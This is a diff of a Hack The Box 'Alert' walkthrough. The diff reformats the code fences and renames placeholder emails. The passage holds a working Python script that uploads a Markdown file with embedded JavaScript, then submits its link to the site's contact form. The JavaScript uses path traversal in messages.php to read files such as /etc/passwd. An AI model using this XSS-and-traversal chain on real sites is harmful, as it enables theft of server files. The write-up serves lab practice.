@@ -86,13 +86,13 @@ fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd")
 
 Now we just need to enumerate the machine and look for interesting files. For this, I create a very simple python script to automatically upload the md file and send the link to the contact us page as shown below
 
----
+```
 import requests, re
 
 def send_to_contact(file_name):
     burp0_url = "http://alert.htb:80/contact.php"
     burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://alert.htb", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/assets/uploads/htb-alert/image/avif,/assets/uploads/htb-alert/image/webp,/assets/uploads/htb-alert/image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-    burp0_data = {"email": "jl@jl.com", "message": file_name}
+    burp0_data = {"email": "zw@zw.com", "message": file_name}
     requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
 
 
@@ -110,7 +110,7 @@ def send_md_request(file_path):
         "Accept-Language": "en-US,en;q=0.9",
         "Connection": "close"
     }
-    burp0_data = f"""------WebKitFormBoundaryJFBXbjnjqVK66x3C\r\nContent-Disposition: form-data; name="file"; filename="jltest.md"\r\nContent-Type: text/markdown\r\n\r\n<script>
+    burp0_data = f"""------WebKitFormBoundaryJFBXbjnjqVK66x3C\r\nContent-Disposition: form-data; name="file"; filename="zwtest.md"\r\nContent-Type: text/markdown\r\n\r\n<script>
 fetch("http://alert.htb/messages.php?file={file_path}")
   .then(response => response.text()) // Convert the response to text
   .then(data => {{
@@ -129,7 +129,7 @@ fetch("http://alert.htb/messages.php?file={file_path}")
 while True:
     send_md_request(input('enter path: '))
 
----
+```
 
 ![alt text](/assets/uploads/htb-alert/image-8.png)
 
